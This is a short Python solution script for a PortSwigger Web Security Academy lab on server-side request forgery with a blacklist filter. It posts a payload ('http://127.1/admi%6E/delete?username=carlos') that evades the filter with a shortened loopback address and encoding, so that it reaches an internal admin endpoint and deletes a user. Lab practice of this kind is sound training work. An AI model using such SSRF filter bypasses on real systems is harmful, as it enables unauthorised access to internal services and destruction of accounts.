"""
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
"""

import sys
import requests
from urllib.parse import unquote

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

name = 'admin'
unquote(name)
unquote(unquote(name))

stock_url = f'https://{site}/product/stock'
stock_api_data = {
    'stockApi': 'http://127.1/admi%6E/delete?username=carlos'
}

resp = requests.post(stock_url, data=stock_api_data)
print(resp.status_code)